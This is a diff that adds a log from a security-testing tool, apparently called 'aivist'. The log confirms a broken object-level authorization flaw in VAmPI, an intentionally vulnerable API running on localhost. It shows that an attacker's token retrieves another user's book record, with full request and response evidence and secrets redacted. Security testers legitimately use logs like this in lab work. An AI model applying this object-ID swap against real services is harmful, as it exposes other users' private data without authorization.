@@ -1,0 +1,69 @@
+# VAmPI /books/v1/{book_title} BOLA  |  attacker=name1 owner=name2  (NO bystander)
+# op: attacker_book_a1 -> victim_book_b2; tokens: attacker+owner ONLY; assert_owner_only=NO
+# UTC 2026-08-12T05:37:11Z
+===== aivist run --config =====
+[verify] http://localhost:5000  GET /books/v1/attacker_book_a1  -> tier=confirmed verdict=verified (exit 0)
+{
+  "mode": "verify",
+  "target": "http://localhost:5000",
+  "result": {
+    "verdict": "verified",
+    "tier": "confirmed",
+    "guard_override": null,
+    "method": "GET",
+    "baseline_path": "/books/v1/attacker_book_a1",
+    "attack_path": "/books/v1/victim_book_b2",
+    "body": null,
+    "degraded": false,
+    "degraded_reason": null,
+    "caller_identity": "owner_not_found",
+    "payload_causality": "no_payload",
+    "state_jump": null,
+    "negative_assertion": null,
+    "owner_view_corroborated": true,
+    "broken_for_all_suspected": null,
+    "scan_skip_reason": null,
+    "evidence": {
+      "baseline": {
+        "request": {
+          "method": "GET",
+          "headers": {
+            "Authorization": "***REDACTED***"
+          },
+          "url": "http://localhost:5000/books/v1/attacker_book_a1",
+          "body": null
+        },
+        "response": {
+          "status_code": 200,
+          "content_length": 84,
+          "url": "http://localhost:5000/books/v1/attacker_book_a1",
+          "body": "{\"book_title\": \"attacker_book_a1\", \"owner\": \"name1\", \"secret\": \"***REDACTED***\"}"
+        }
+      },
+      "attack": {
+        "request": {
+          "method": "GET",
+          "headers": {
+            "Authorization": "***REDACTED***"
+          },
+          "url": "http://localhost:5000/books/v1/victim_book_b2",
+          "body": null
+        },
+        "response": {
+          "status_code": 200,
+          "content_length": 93,
+          "url": "http://localhost:5000/books/v1/victim_book_b2",
+          "body": "{\"book_title\": \"victim_book_b2\", \"owner\": \"name2\", \"secret\": \"***REDACTED***\"}"
+        }
+      },
+      "owner_view": {
+        "status": 200,
+        "reason": "ok",
+        "corroborated": true,
+        "body": "{\"book_title\": \"victim_book_b2\", \"owner\": \"name2\", \"secret\": \"***REDACTED***\"}"
+      }
+    }
+  },
+  "exit_code": 0
+}
+===== process exit=0 =====
